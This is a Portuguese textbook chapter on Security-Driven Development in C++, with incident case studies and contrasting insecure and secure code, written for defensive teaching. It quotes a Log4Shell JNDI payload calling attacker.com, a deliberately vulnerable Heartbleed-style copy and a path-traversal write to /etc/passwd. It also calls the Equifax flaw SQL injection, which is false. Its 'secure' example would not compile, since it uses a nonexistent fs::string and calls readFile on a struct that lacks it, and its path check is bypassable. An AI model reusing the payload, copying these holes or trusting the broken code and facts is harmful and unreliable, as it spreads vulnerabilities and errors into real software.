# Capítulo 1 — Introdução ao Security-Driven Development

> "Segurança não é um produto, mas um processo." — Bruce Schneier

---

## Objetivos de Aprendizado

Ao final deste capítulo, você será capaz de:

1. **Definir e aplicar** os princípios fundamentais do Security-Driven Development (SDD) em projetos de software com C++.
2. **Distinguir** SDD de abordagens tradicionais como DevSecOps e Secure SDLC, identificando quando cada uma é mais adequada.
3. **Utilizar** modelos de ameaças (STRIDE, DREAD, PASTA) para classificar e priorizar riscos de segurança em código C++.
4. **Mapear** vulnerabilidades do OWASP Top 10 e CWE/SANS Top 25 para padrões específicos de código C++ e aplicar as mitigações correspondentes.
5. **Projetar** sistemas de software em C++ incorporando segurança desde a concepção, evitando o custo exponencial de correções tardias em produção.

---

## 1. O que é Security-Driven Development

### 1.1 Definição e Princípios Fundamentais

Security-Driven Development (SDD) é uma metodologia de desenvolvimento de software que integra considerações de segurança em **todas** as fases do ciclo de vida do desenvolvimento — desde a concepção e requisitos até a manutenção e descomissionamento. Diferentemente de abordagens tradicionais onde a segurança é tratada como uma camada adicionada ao final, SDD coloca a segurança como um **driver** (motivador) central das decisões de design e implementação.

Os princípios fundamentais do SDD são:

| Princípio | Descrição |
|-----------|-----------|
| **Segurança como requisito** | Requisitos de segurança são documentados com a mesma rigorosidade que requisitos funcionais |
| **Defesa em profundidade** | Múltiplas camadas de proteção, onde a falha de uma não compromete o sistema inteiro |
| **Menor privilégio** | Cada componente opera com o mínimo de permissões necessário |
| **Fail-safe defaults** | Decisões de segurança padrão favorecem a rejeição em caso de dúvida |
| **Separação de responsabilidades** | Nenhum componente detém poder total sobre o sistema |
| **Segurança no design** | Decisões de arquitetura eliminam classes inteiras de vulnerabilidades antes do código ser escrito |
| **Verificação contínua** | Segurança é validada continuamente, não apenas em auditorias periódicas |

### 1.2 SDD versus o Modelo Tradicional

No modelo tradicional de SDLC (Software Development Life Cycle), a segurança geralmente aparece nas fases finais:

```
SDLC Tradicional:
Requisitos -> Design -> Implementação -> Testes -> [Segurança aqui] -> Deploy
                                                       ^
                                                       |
                                                  Auditoria pontual
                                                  (late-stage scanning)
```

No SDD, a segurança permeia todas as fases:

```
SDD:
[Segurança + Requisitos] -> [Segurança + Design] -> [Segurança + Implementação]
        -> [Segurança + Testes] -> [Segurança + Deploy] -> [Segurança + Monitoramento]
              ^                        ^                        ^
              |                        |                        |
         Threat modeling         SAST/DAST/IAST         Runtime protection
         Security specs          Code review             Incident response
         Risk assessment         Penetration testing     Forensics readiness
```

### 1.3 A Mudança de Reativo para Proativo

A mudança fundamental que SDD promove é a transição de uma postura **reativa** (corrigir vulnerabilidades depois que são descobertas) para uma postura **proativa** (impedir que vulnerabilidades sejam introduzidas no primeiro lugar).

**Postura Reativa (Tradicional):**
- Vulnerabilidade é descoberta por terceiros ou em produção
- Time de segurança analisa o impacto
- Patches de emergência são desenvolvidos
- Hotfix é aplicado com pressa
- Custos elevados: remediação + dano reputacional + regulatory fines

**Postura Proativa (SDD):**
- Ameaças são modeladas antes da implementação
- Arquitetura elimina classes de vulnerabilidades
- Padrões de código seguros são estabelecidos e enforced
- Segurança é verificada continuamente via ferramentas automatizadas
- Custos reduzidos: investimento antecipado, sem surpresa em produção

### 1.4 SDD versus DevSecOps versus Secure SDLC

É comum confundir esses termos. Vamos esclarecer cada um:

**Secure SDLC** é o mais abrangente — refere-se a qualquer SDLC que incorpora práticas de segurança. É um termo genérico que pode incluir desde auditorias pontuais até integração completa.

**DevSecOps** é uma evolução do DevOps que incorpora segurança na pipeline de CI/CD. Seu foco está na **automação** de verificações de segurança durante o build, deploy e operações.

**SDD** vai além de DevSecOps ao colocar a segurança como um **driver de design**, não apenas como uma verificação na pipeline. SDD influencia decisões arquiteturais, padrões de código e modelos de ameaças desde o momento em que um requisito é formulado.

| Aspecto | Secure SDLC | DevSecOps | SDD |
|---------|-------------|-----------|-----|
| Escopo | Processo | Automação + Cultura | Metodologia completa |
| Foco principal | Compliance | Velocidade + Segurança | Design + Arquitetura |
| Quando começa | Pós-design | CI/CD | Concepção do requisito |
| Threat modeling | Opcional | Opcional | Obrigatório |
| Ferramentas | Auditorias | SAST/DAST/SCA | Todas + modelagem |
| Propriedade | Time de segurança | Time compartilhado | Time inteiro desde o início |

### 1.5 O Manifesto SDD

Assim como o Manifesto Ágil transformou o desenvolvimento de software, o SDD propõe princípios que guiam decisões diárias:

- **ValORIZAMOS a prevenção de vulnerabilidades sobre a detecção tardia**
- **Priorizamos design seguro sobre patches rápidos**
- **Preferimos eliminação de classes de bugs sobre tratamento individual**
- **Consideramos modelagem de ameaças mais valiosa que testes de penetração isolados**
- **Documentamos decisões de segurança com a mesma importância que decisões funcionais**
- **Investimos em treinamento de segurança do time como pré-requisito, não como opt-in**
- **Medimos maturidade de segurança com métricas, não com sensações**

Isso não significa que detecção, patches e testes de penetração não tenham valor — significam que a prevenção no design deveria ser o **primeiro** e mais importante nível de defesa.

### 1.6 Casos Públicos Documentados: Lições para o SDD

Para compreender a importância do SDD, é fundamental analisar incidentes reais que marcaram a história da segurança de software. Cada caso abaixo demonstra como a ausência de princípios de security-by-design levou a consequências catastróficas.

#### Heartbleed — CVE-2014-0160

**O que aconteceu:** Uma falha de buffer over-read no OpenSSL (TLS heartbeat extension) permitia que atacantes lessem até 64 KB de memória do processo do servidor a cada requisição maliciosa. A memória exposta podia conter chaves privadas, senhas de usuários e tokens de sessão.

**Impacto:** Aproximadamente 17% de todos os servidores TLS da internet (cerca de 500.000 servidores) foram afetados. Chaves privadas de certificados SSL foram comprometidas, permitindo interceptação de tráfego em larga escala. O custo estimado de remediação global foi de **$500 milhões**.

**O que deu errado:**
- O código do OpenSSL não implementava bounds checking no parsing do campo `payload` do heartbeat
- A variável `payload_length` era aceita do cliente sem validação contra o tamanho real do payload
- Não existiam testes automatizados para cenários de input adversarial
- Revisão de código manual insuficiente — o código estava lá há dois anos

**Como o SDD teria prevenido:**
- **Segurança no design:** A extensão heartbeat deveria ter sido projetada com validação rigorosa de tamanho desde a concepção
- **RAII e tipos seguros:** Uso de `std::vector` ou `std::span` em vez de raw pointer arithmetic
- **Defesa em profundidade:** Memory-safe languages ou wrappers teriam eliminado a classe de bug (CWE-126)
- **Verificação contínua:** Fuzzing automatizado teria encontrado o bug antes do release

```cpp
// VULNERABLE pattern (similar to Heartbleed):
void heartbeat(const uint8_t* payload, size_t payload_len,
               uint8_t* response, size_t* response_len) {
    // CRITICAL: payload_len comes from client, not validated
    // This reads beyond the actual payload buffer
    memcpy(response, payload, payload_len);  // buffer over-read!
    *response_len = payload_len;
}

// SECURE pattern (SDD approach):
void heartbeatSecure(const uint8_t* payload, size_t actual_len,
                     uint16_t claimed_len,
                     uint8_t* response, size_t* response_len) {
    // Validate that claimed_len does not exceed actual buffer size
    if (claimed_len > actual_len) {
        throw std::invalid_argument("Heartbeat payload length exceeds buffer");
    }
    // Safe: we only copy what we know exists
    std::memcpy(response, payload, claimed_len);
    *response_len = claimed_len;
}
```

#### Shellshock — CVE-2014-6271

**O que aconteceu:** Uma falha no Bash permitia execução remota de comandos através de variáveis de ambiente manipuladas. Um atacante podia injetar código arbitrário em qualquer serviço que passasse variáveis de ambiente para o Bash (CGI scripts, DHCP clients, SSH ForceCommand).

**Impacto:** Servidores web, dispositivos IoT, roteadores e sistemas embarcados em todo o mundo. Estimou-se que 500 milhões de dispositivos foram potencialmente afetados. O CVE-2014-6271 teve CVSS 10.0 (máximo).

**O que deu errado:**
- O Bash interpretava código dentro de valores de variáveis de ambiente durante definições de função
- Não havia sanitização de input antes de passar dados para o interpretador
- A funcionalidade de "function export" não distinguia entre definição de função e dados

**Como o SDD teria prevenido:**
- **Validação em fronteiras:** Nunca passar dados brutos de rede para interpretadores de shell
- **Separação de responsabilidades:** Serviços web não deveriam invocar shells para processar input de rede
- **Princípio de menor privilégio:** Processos web rodando com permissões mínimas

#### EternalBlue / WannaCry — CVE-2017-0144

**O que aconteceu:** O EternalBlue era um exploit para uma vulnerabilidade no protocolo SMBv1 do Windows, originalmente desenvolvido pela NSA e vazado pelo grupo Shadow Brokers. O ransomware WannaCry e o worm NotPetya usaram esse exploit para propagação automatizada.

**Impacto:** WannaCry infectou mais de 200.000 computadores em 150 países em maio de 2017, incluindo o Serviço Nacional de Saúde do Reino Unido (NHS), a Telefônica espanhola e a Renault. NotPetya, em junho de 2017, causou mais de **$10 bilhões** em danos globais, afetando Maersk, Merck, FedEx e dezenas de outras empresas.

**O que deu errado:**
- O protocolo SMBv1 era obsoleto mas continuava habilitado por padrão
- A Microsoft já havia lançado o patch (MS17-010) meses antes, mas muitos sistemas não foram atualizados
- Falta de segmentação de rede permitiu propagação lateral
- O EternalBlue explorava um buffer overflow no processamento de pacotes SMB

**Como o SDD teria prevenido:**
- **Fail-safe defaults:** SMBv1 deveria estar desabilitado por padrão
- **Defesa em profundidade:** Segmentação de rede teria limitado a propagação
- **Verificação contínua:** Patch management automatizado teria aplicado MS17-010
- **Segurança no design:** O protocolo SMBv1 não deveria ter permitido tamanho de mensagem arbitrário sem validação

#### Log4Shell — CVE-2021-44228

**O que aconteceu:** Uma vulnerabilidade de Remote Code Execution (RCE) na biblioteca de logging Apache Log4j 2. Ao injetar uma string JNDI maliciosa (como `${jndi:ldap://attacker.com/exploit}`) em qualquer dado que fosse logado, o Log4j executava lookup JNDI que conectava a um servidor controlado pelo atacante, retornando e executando código arbitrário.

**Impacto:** A vulnerabilidade afetou milhões de aplicações Java em todo o mundo, incluindo Apple iCloud, Amazon, Twitter, Minecraft, Cloudflare e dezenas de outras plataformas. O CVSS foi 10.0. O custo estimado de remediação global ultrapassou **$100 bilhões**.

**O que deu errado:**
- A funcionalidade de lookup JNDI estava habilitada por padrão
- O Log4j aceitava strings arbitrárias no input sem sanitização
- A biblioteca era dependência transitória de milhares de projetos
- Não havia documentação sobre os riscos de JNDI lookup

**Como o SDD teria prevenido:**
- **Fail-safe defaults:** JNDI lookup deveria estar desabilitado por padrão (feito apenas na versão 2.17.0)
- **Menor privilégio:** Bibliotecas de logging não deveriam ter capacidade de execução remota
- **Segurança no design:** Função de logging não deveria interpretar expressões no conteúdo logado
- **Verificação contínua:** Software Composition Analysis (SCA) teria identificado a dependência em tempo real

#### SolarWinds Supply Chain Attack (2020)

**O que aconteceu:** Atacantes (atribuídos a grupos de inteligência russos) comprometeram o build pipeline da SolarWinds e injetaram código malicioso no software Orion IT Management. A atualização comprometida foi distribuída para 18.000 clientes, incluindo agências governamentais dos EUA (Treasury, Commerce, DHS, DOE) e empresas Fortune 500.

**Impacto:** O malware SUNBURST operou por meses antes de ser detectado. O custo estimado para as empresas afetadas foi de **$100+ milhões**. A confiança na supply chain de software foi abalada globalmente.

**O que deu errado:**
- O build pipeline da SolarWinds não tinha verificação de integridade do código compilado
- Não havia code signing em binaries internos
- O malware se disfarçava como tráfego legítimo do Orion
- Falta de observabilidade no comportamento do software após deploy

**Como o SDD teria prevenido:**
- **Separação de responsabilidades:** Builds deveriam ser verificados por sistema independente
- **Integridade de dados:** Code signing e verificação de hash em todas as atualizações
- **Verificação contínua:** Monitoramento de comportamento pós-deploy
- **Defesa em profundidade:** Zero trust architecture teria limitado o alcance lateral

#### Equifax Breach (2017)

**O que aconteceu:** Exploração de uma vulnerabilidade de SQL injection (CVE-2017-5638) no Apache Struts para obter acesso a dados pessoais de 147 milhões de consumidores americanos, incluindo números de seguro social, datas de nascimento e endereços.

**Impacto:** 147 milhões de pessoas afetadas. Custo total para a Equifax: **$1.4 bilhões**. Multa de $575 milhões pela FTC. Queda de 35% no valor das ações da empresa.

**O que deu errado:**
- O patch para CVE-2017-5638 estava disponível meses antes da exploração, mas não foi aplicado
- O WAF (Web Application Firewall) foi desativado por 19 meses durante uma atualização
- Dados sensíveis não estavam criptografados em trânsito entre bancos de dados internos
- Falta de segmentação de rede entre sistemas internos

**Como o SDD teria prevenido:**
- **Verificação contínua:** Patch management automatizado com SLA de 48h para CVEs críticos
- **Segurança no design:** Dados sensíveis deveriam estar criptografados em repouso e em trânsito
- **Defesa em profundidade:** Múltiplas camadas teriam limitado o alcance
- **Modelagem de ameaças:** STRIDE teria identificado o componente como ponto crítico

#### Target Breach (2013)

**O que aconteceu:** Credenciais de um fornecedor de ar-condicionado foram comprometidas via phishing, dando acesso à rede da Target. Os atacantes instalaram malware em terminais de pagamento (POS) e roubaram dados de 40 milhões de cartões de crédito/débito e informações pessoais de 70 milhões de clientes.

**Impacto:** 40 milhões de cartões comprometidos. 70 milhões de registros pessoais expostos. Custo total: **$292 milhões**. Demissão do CEO e CIO.

**O que deu errado:**
- O fornecedor tinha acesso desnecessário à rede de pagamentos
- O alerta do FireEye (sistema de detecção) foi ignorado pelo time de segurança
- Dados de pagamento não estavam criptografados no disco dos terminais POS
- Falta de segmentação de rede entre parceiros e sistemas críticos

**Como o SDD teria prevenido:**
- **Menor privilégio:** Fornecedor não deveria ter acesso à rede de pagamentos
- **Separação de responsabilidades:** Rede de pagamentos deveria ser segmentada
- **Verificação contínua:** Alertas de segurança deveriam ter resposta automatizada
- **Segurança no design:** Dados de cartão deveriam estar tokenizados ou criptografados

#### Stuxnet (2010)

**O que aconteceu:** Worm sofisticado projetado para sabotar centrais nucleares do Irã. Explorava quatro vulnerabilidades zero-day simultaneamente para se propagar via USB drives e redes Windows, alvejando controladores PLC Siemens Step 7.

**Impacto:** Destruição de aproximadamente 1.000 centrífugas nucleares. Primeiro malware conhecido a causar danos físicos a infraestrutura industrial.

**O que deu errado:**
- Sistemas industriais confiavam na segmentação de rede como única defesa
- Controladores PLC não tinham verificação de integridade de código
- USB drives não tinham restrição de execução
- Falta de monitoramento comportamental em redes SCADA

**Como o SDD teria prevenido:**
- **Defesa em profundidade:** Múltiplas camadas de verificação além da segmentação
- **Integridade de dados:** Verificação criptográfica de código em controladores
- **Fail-safe defaults:** USB drives com auto-execução desabilitada
- **Verificação contínua:** Monitoramento comportamental de processos industriais

#### NotPetya (2017)

**O que aconteceu:** Ransomware/worm que se propagava via EternalBlue (CVE-2017-0144) e credential dumping. Disfarçado como ransomware, na verdade era wiper — destruía dados sem possibilidade de recuperação. Atingiu principalmente empresas na Ucrânia mas se espalhou globalmente.

**Impacto:** Maersk ($300M), Merck ($870M), FedEx ($400M), Reckitt Benckiser ($129M). Dano total global estimado em **$10 bilhões**. O incidente mais custoso da história de cibersegurança.

**O que deu errado:**
- Dependência de software desatualizado (M.E.Doc ucraniano)
- Falta de segmentação de rede permitiu propagação lateral explosiva
- Credenciais locais com privilégios elevados facilitaram o credential dumping
- Ausência de backup offline para recuperação de desastres

**Como o SDD teria prevenido:**
- **Fail-safe defaults:** SMBv1 desabilitado, credenciais locais minimizadas
- **Defesa em profundidade:** Segmentação de rede + backups offline + EDR
- **Menor privilégio:** Contas com privilégios mínimos, credenciais rotativas
- **Verificação contínua:** Monitoramento de comportamento de rede em tempo real

#### Samsung RKP Vulnerability — CVE-2024-49410

**O que aconteceu:** Uma vulnerabilidade no Samsung Knox Guard (RKP — Runtime Kernel Protection) permitia que processos não confiáveis contornassem proteções de segurança do kernel. A falha estava na verificação de permissões do módulo RKP, que não validava corretamente o contexto de chamadas do sistema.

**Impacto:** Dispositivos Samsung Galaxy afetados. Possibilidade de bypass de proteções de segurança do kernel, permitindo execução de código arbitrário em modo kernel.

**O que deu errado:**
- O módulo RKP confiava em metadados fornecidos pelo chamador sem validação cruzada
- Falta de verificação de integridade nas chamadas de sistema do módulo
- A camada de proteção estava implementada sem considerar adversários internos ao sistema

**Como o SDD teria prevenido:**
- **Separação de responsabilidades:** O módulo RKP não deveria confiar em dados do chamador
- **Segurança no design:** Verificação de integridade como requisito arquitetural do módulo
- **Defesa em profundidade:** Múltiplas camadas de verificação de permissão
- **Verificação contínua:** Fuzzing de chamadas de sistema para encontrar bypasses

#### Qualcomm GPU Use-After-Free — CVE-2023-33106

**O que aconteceu:** Uma vulnerabilidade de use-after-free no driver GPU do Qualcomm (Adreno) permitia execução de código arbitrário em modo kernel a partir de aplicações de userland. O bug estava no gerenciamento de memória compartilhada entre processos GPU.

**Impacto:** Dispositivos Android com chipsets Qualcomm (a maioria dos flagship Android). CVE com severidade "High" no Android Security Bulletin. Exploração ativa em dispositivos não atualizados.

**O que deu errado:**
- O driver GPU liberava memória compartilhada antes de garantir que todos os referenciadores a tivessem liberado
- Falta de contagem de referências adequada em objetos de memória compartilhada
- O código do driver operava com raw pointers sem smart pointers ou RAII

**Como o SDD teria prevenido:**
- **RAII:** Uso de `std::shared_ptr` ou referência counting automatizada para objetos de memória compartilhada
- **Segurança no design:** O gerenciamento de memória deveria ter sido projetado com ownership semantics claras
- **Verificação contínua:** AddressSanitizer em testes automatizados teria detectado o use-after-free
- **Menor privilégio:** Drivers GPU não deveriam operar em kernel mode desnecessariamente

#### Android Binder Vulnerability — CVE-2023-26083

**O que aconteceu:** Uma vulnerabilidade de out-of-bounds read no subsistema Binder do Android permitia que processos maliciosos lessem memória do kernel. O bug estava na validação de tamanhos de buffers no IPC Binder, permitindo que metadados de transação fossem manipulados.

**Impacto:** Dispositivos Android com versões específicas do kernel. Possível escalonamento de privilégios de userland para kernel. Exploração ativa reportada antes do patch.

**O que deu errado:**
- O Binder não validava corretamente o tamanho dos buffers de transação contra os limites do processo destinatário
- Metadados de transação eram copiados sem verificação de bounds adequada
- Falta de fuzzing sistemático no subsistema Binder

**Como o SDD teria prevenido:**
- **Validação em fronteiras:** Todo input de userland deveria ser validado contra limites conhecidos antes de cópia para kernel
- **Tipos seguros:** Uso de span types com bounds checking em vez de raw pointer arithmetic
- **Verificação contínua:** Syzkaller ou AFL fuzzing contínuo do subsistema Binder
- **Defesa em profundidade:** Kernel Address Space Layout Randomization (KASLR) como segunda linha de defesa

### 1.7 Lições Consolidadas dos Casos Documentados

| Princípio SDD | Vulnerabilidade que Previne | CVEs Relacionados |
|---------------|-----------------------------|-------------------|
| Fail-safe defaults | Execução não autorizada | CVE-2014-6271, CVE-2021-44228 |
| Validação em fronteiras | Buffer over-read/write | CVE-2014-0160, CVE-2023-26083 |
| Menor privilégio | Escalação de privilégio | CVE-2023-33106, CVE-2024-49410 |
| Defesa em profundidade | Propagação lateral | CVE-2017-0144, NotPetya |
| Verificação contínua | Falta de patch | CVE-2017-5638 (Equifax) |
| Separação de responsabilidades | Supply chain compromise | SolarWinds 2020 |
| Segurança no design | Classes inteiras de bugs | Todos os CVEs acima |

O padrão é claro: **cada um desses incidentes poderia ter sido prevenido ou mitigado significativamente** se os princípios do SDD tivessem sido aplicados desde a fase de design. O custo de prevenção é uma fração mínima do custo de remediação.

---

## 2. Security by Design versus Security by Afterthought

### 2.1 Contexto Histórico

Durante décadas, segurança em software foi tratada como um "acréscimo" — algo que era verificado (ou não) quando o software já estava pronto para produção. Esse modelo levou a falhas catastróficas em sistemas de todos os portes:

- **2014 — Heartbleed (OpenSSL):** Uma falha de buffer over-read que afetou milhões de servidores. O código OpenSSL não havia sido projetado com memory safety como requisito arquitetural.
- **2017 — Equifax Breach:** Exploração de uma vulnerabilidade em Apache Struts que havia sido divulgada meses antes. A ausência de um processo de security-by-design permitiu que o patch não fosse aplicado sistematicamente.
- **2020 — SolarWinds Supply Chain:** Comprometimento de uma atualização de software que afetou agências governamentais. A arquitetura do build pipeline não incluía verificação de integridade como princípio de design.

Esses eventos reforçam um padrão: **quando segurança é um afterthought, ela sempre perde prioridade para funcionalidade e prazos**.

### 2.2 O Multiplicador de Custo

Dados consolidados da indústria demonstram que o custo de corrigir uma vulnerabilidade cresce exponencialmente conforme o ciclo de vida avança:

```
Custo relativo de correção por fase:
  Requisitos:        1x
  Design:            5x
  Implementação:     10x
  Testes:            30x
  Produção:          100x — 1000x

Fonte: IBM Systems Sciences Institute; NIST
```

Isso significa que corrigir uma falha de segurança encontrada em produção pode custar até **1000 vezes mais** do que tê-la eliminado na fase de design. O investimento em SDD não é um custo — é uma **economia**.

### 2.3 Decisões de Design que Eliminam Classes de Vulnerabilidades

Certain design decisions can eliminate entire classes of bugs before a single line of implementation code is written:

1. **Uso de tipos fortemente tipados** — Elimina confusão de tipos e conversões inseguras
2. **RAII (Resource Acquisition Is Initialization)** — Elimina memory leaks e dangling pointers
3. **Smart pointers em vez de raw pointers** — Elimina double-free e use-after-free
4. **Bounds-checked containers** — Elimina buffer overflows
5. **Imutabilidade por padrão** — Elimina race conditions em dados compartilhados
6. **Separação de privilégios na arquitetura** — Elimina classes inteiras de elevation of privilege
7. **Validação em fronteiras** — Elimina injection attacks

### 2.4 Exemplo: Hierarquia de Classes com e sem Segurança no Design

Considere um sistema de gerenciamento de arquivos que precisa de autenticação e autorização. Primeiro, veremos a abordagem **without security in design**, depois a abordagem **with security by design**.

#### Versão SEM Segurança no Design (Security by Afterthought)

```cpp
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <unordered_map>

// DESIGN FLAW: No separation of concerns, no security primitives
// Security is bolted on after the core logic is complete

class FileManager {
public:
    FileManager(const std::string& basePath) : basePath_(basePath) {}

    // No authentication check here — will be added later via patches
    std::string readFile(const std::string& filename) {
        // VULNERABLE: No path traversal validation
        // VULNERABLE: No authorization check
        // VULNERABLE: No file size limit (DoS vector)
        std::string fullPath = basePath_ + "/" + filename;
        std::ifstream file(fullPath);
        if (!file.is_open()) {
            return "ERROR: File not found";
        }

        std::string content(
            (std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>()
        );
        return content;
    }

    bool writeFile(const std::string& filename, const std::string& content) {
        // PATCH: Added auth check as an afterthought
        // This pattern leads to inconsistent enforcement
        if (!isAuthenticated_) {
            std::cerr << "WARN: Unauthorized write attempt" << std::endl;
            return false;
        }

        // VULNERABLE: Still no path traversal check
        // VULNERABLE: No input sanitization
        std::string fullPath = basePath_ + "/" + filename;
        std::ofstream file(fullPath);
        if (!file.is_open()) {
            return false;
        }
        file << content;
        return true;
    }

    // PATCH: Authentication added as a method, not as an architectural concept
    void setAuthenticated(bool auth) { isAuthenticated_ = auth; }

    // PROBLEM: Admin check is scattered across methods
    bool deleteUser(const std::string& userId) {
        if (!isAuthenticated_) return false;
        if (userId == "admin") {
            // PATCH: hardcoded special case added after a security review
            std::cerr << "WARN: Cannot delete admin" << std::endl;
            return false;
        }
        // ... deletion logic
        std::cout << "User " << userId << " deleted" << std::endl;
        return true;
    }

private:
    std::string basePath_;
    bool isAuthenticated_ = false; // Not thread-safe, no session management
};

// PROBLEM: Usage code has security checks scattered everywhere
int main() {
    FileManager fm("/tmp/data");
    fm.setAuthenticated(true);
    std::string data = fm.readFile("config.txt");  // No auth check on read

    fm.writeFile("../../../etc/passwd", "evil content");  // Path traversal!

    fm.setAuthenticated(false);
    fm.readFile("secret.txt");  // No auth check on read!

    fm.setAuthenticated(true);
    fm.deleteUser("admin");  // Would fail, but only because of hardcoded check

    return 0;
}
```

**Problemas nesta versão:**
- Segurança não faz parte do design — é "remendada" com patches
- Checks de autenticação são inconsistentes (existe em `writeFile` mas não em `readFile`)
- Não há proteção contra path traversal
- Admin check é hardcodado e não escalável
- Não há separação entre identidade, autorização e operação
- Código cliente precisa lembrar de chamar `setAuthenticated`
- Não é thread-safe

#### Versão COM Segurança no Design (Security by Design)

```cpp
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <unordered_map>
#include <memory>
#include <stdexcept>
#include <algorithm>
#include <filesystem>
#include <mutex>
#include <random>
#include <sstream>
#include <iomanip>
#include <chrono>

namespace fs = std::filesystem;

// DESIGN PRIMITIVE: Strong typing prevents confusion of security concepts
enum class Permission : uint8_t {
    None     = 0,
    Read     = 1 << 0,
    Write    = 1 << 1,
    Delete   = 1 << 2,
    Admin    = 1 << 3
};

Permission operator|(Permission a, Permission b) {
    return static_cast<Permission>(
        static_cast<uint8_t>(a) | static_cast<uint8_t>(b)
    );
}

Permission operator&(Permission a, Permission b) {
    return static_cast<Permission>(
        static_cast<uint8_t>(a) & static_cast<uint8_t>(b)
    );
}

bool hasPermission(Permission granted, Permission required) {
    return (static_cast<uint8_t>(granted) & static_cast<uint8_t>(required))
           == static_cast<uint8_t>(required);
}

// DESIGN PRIMITIVE: Identity is a first-class concept, not a boolean flag
struct UserIdentity {
    std::string userId;
    std::string sessionId;
    Permission permissions;
    std::chrono::steady_clock::time_point sessionExpiry;

    bool isExpired() const {
        return std::chrono::steady_clock::now() > sessionExpiry;
    }

    bool has(Permission required) const {
        return !isExpired() && hasPermission(permissions, required);
    }
};

// DESIGN PRIMITIVE: Path validation as a reusable security primitive
class SecurePath {
public:
    static fs::path resolve(const fs::string& basePath,
                            const std::string& userPath) {
        fs::path resolved = fs::path(basePath) / userPath;
        resolved = fs::weakly_canonical(resolved);
        fs::path canonicalBase = fs::weakly_canonical(basePath);

        if (resolved.string().find(canonicalBase.string()) != 0) {
            throw std::runtime_error(
                "Path traversal detected: " + userPath
            );
        }
        return resolved;
    }
};

// DESIGN PRIMITIVE: Audit logging as an architectural component
class AuditLogger {
public:
    static AuditLogger& instance() {
        static AuditLogger logger;
        return logger;
    }

    void log(const std::string& userId, const std::string& action,
             const std::string& resource, bool success) {
        std::lock_guard<std::mutex> lock(mutex_);
        auto now = std::chrono::system_clock::now();
        auto time_t_now = std::chrono::system_clock::to_time_t(now);

        std::cout << "[" << std::put_time(std::localtime(&time_t_now),
                   "%Y-%m-%d %H:%M:%S")
                  << "] user=" << userId
                  << " action=" << action
                  << " resource=" << resource
                  << " result=" << (success ? "SUCCESS" : "DENIED")
                  << std::endl;
    }

private:
    AuditLogger() = default;
    std::mutex mutex_;
};

// DESIGN PRIMITIVE: Authorization gateway — all operations go through here
class AuthorizationGateway {
public:
    explicit AuthorizationGateway(const fs::string& basePath)
        : basePath_(fs::weakly_canonical(basePath)) {
        if (!fs::exists(basePath_)) {
            throw std::runtime_error("Base path does not exist");
        }
    }

    std::string readFile(const UserIdentity& user,
                         const std::string& filename) {
        if (!user.has(Permission::Read)) {
            AuditLogger::instance().log(
                user.userId, "READ", filename, false
            );
            throw std::runtime_error("Insufficient permissions for read");
        }

        fs::path fullPath = SecurePath::resolve(basePath_, filename);
        std::ifstream file(fullPath, std::ios::binary);
        if (!file.is_open()) {
            AuditLogger::instance().log(
                user.userId, "READ", filename, false
            );
            throw std::runtime_error("File not found or inaccessible");
        }

        // Resource exhaustion protection
        auto fileSize = fs::file_size(fullPath);
        constexpr std::uintmax_t MAX_FILE_SIZE = 100 * 1024 * 1024; // 100 MB
        if (fileSize > MAX_FILE_SIZE) {
            AuditLogger::instance().log(
                user.userId, "READ", filename, false
            );
            throw std::runtime_error("File exceeds maximum allowed size");
        }

        std::string content(
            (std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>()
        );
        AuditLogger::instance().log(user.userId, "READ", filename, true);
        return content;
    }

    bool writeFile(const UserIdentity& user, const std::string& filename,
                   const std::string& content) {
        if (!user.has(Permission::Write)) {
            AuditLogger::instance().log(
                user.userId, "WRITE", filename, false
            );
            throw std::runtime_error("Insufficient permissions for write");
        }

        fs::path fullPath = SecurePath::resolve(basePath_, filename);
        fs::path parentDir = fullPath.parent_path();
        if (!fs::exists(parentDir)) {
            fs::create_directories(parentDir);
        }

        std::ofstream file(fullPath, std::ios::binary);
        if (!file.is_open()) {
            AuditLogger::instance().log(
                user.userId, "WRITE", filename, false
            );
            return false;
        }
        file << content;
        AuditLogger::instance().log(user.userId, "WRITE", filename, true);
        return true;
    }

    bool deleteUser(const UserIdentity& user, const std::string& targetId) {
        if (!user.has(Permission::Delete)) {
            AuditLogger::instance().log(
                user.userId, "DELETE_USER", targetId, false
            );
            throw std::runtime_error("Insufficient permissions for delete");
        }

        if (!user.has(Permission::Admin)) {
            AuditLogger::instance().log(
                user.userId, "DELETE_USER", targetId, false
            );
            throw std::runtime_error(
                "Admin permission required to delete users"
            );
        }

        if (targetId == user.userId) {
            AuditLogger::instance().log(
                user.userId, "DELETE_USER", targetId, false
            );
            throw std::runtime_error("Cannot delete your own account");
        }

        AuditLogger::instance().log(
            user.userId, "DELETE_USER", targetId, true
        );
        std::cout << "User " << targetId << " deleted successfully" << std::endl;
        return true;
    }

private:
    fs::path basePath_;
};

// Usage demonstrates clean, security-aware API
int main() {
    try {
        AuthorizationGateway gateway("/tmp/data");

        UserIdentity adminUser{
            "admin123",
            "sess_abc123",
            Permission::Read | Permission::Write | Permission::Delete | Permission::Admin,
            std::chrono::steady_clock::now() + std::chrono::hours{1}
        };

        UserIdentity readOnlyUser{
            "user456",
            "sess_def456",
            Permission::Read,
            std::chrono::steady_clock::now() + std::chrono::hours{1}
        };

        // Authorized operations — audit logged
        std::string data = gateway.readFile(adminUser, "config.txt");
        gateway.writeFile(adminUser, "output.txt", "secure content");

        // Authorization enforced — throws, audit logged as DENIED
        try {
            std::string secret = readOnlyUser.readFile("config.txt");
        } catch (const std::runtime_error& e) {
            std::cout << "Expected denial: " << e.what() << std::endl;
        }

        // Path traversal blocked at the architectural level
        try {
            gateway.readFile(adminUser, "../../../etc/passwd");
        } catch (const std::runtime_error& e) {
            std::cout << "Path traversal blocked: " << e.what() << std::endl;
        }

    } catch (const std::exception& e) {
        std::cerr << "Fatal: " << e.what() << std::endl;
        return 1;
    }
    return 0;
}
```

**Vantagens desta versão:**
- Segurança é parte do design, não um patch
- `UserIdentity` é um conceito de primeira classe com permissões granulares
- `SecurePath` elimina path traversal como classe de vulnerabilidade
- `AuthorizationGateway` centraliza todas as verificações de acesso
- `AuditLogger` garante rastreabilidade como requisito arquitetural
- Permissões são bitflags tipadas — impossível confundir com booleanos
- Exceções controladas em vez de códigos de erro silenciosos
- O código cliente não pode "esquecer" de verificar permissões

---

## 3. Modelos de Ameaças

